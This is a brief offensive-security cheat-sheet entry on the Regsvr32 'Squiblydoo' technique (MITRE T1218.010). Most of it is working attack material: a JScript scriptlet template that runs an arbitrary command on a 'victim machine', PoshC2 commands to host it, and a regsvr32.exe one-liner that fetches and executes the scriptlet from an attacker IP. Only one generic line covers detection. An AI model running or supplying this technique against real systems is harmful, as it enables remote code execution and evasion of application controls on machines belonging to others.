# [Regsvr32](https://attack.mitre.org/techniques/T1218/010/)

## Exploit syntax:
1. Create a file and save this to /tmp/mrNimbus.txt. Save the command you wish to run on the victim machine in the \<COMMAND HERE> line in the script. 
```
<?XML version="1.0"?>
<scriptlet>
<registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
  <script language="JScript">
    <![CDATA[
      var foo = new ActiveXObject("WScript.Shell").Run("<COMMAND HERE>"); 
    ]]>
</script>
</registration>
</scriptlet>
```
2. In posh run:
    ```
    add-hosted-file

    /tmp/mrNimbus.txt

    /controls/police

    text/html

    N
    ```

 3. In your beacon, run this with your malicious IP
  ```
  regsvr32.exe /s /i:http://<IP ADDRESS>/controls/police scrobj.dll
  ```



## Detection Technique:
* Monitor regsvr32.exe for malicious code execution.

## Resource
* https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo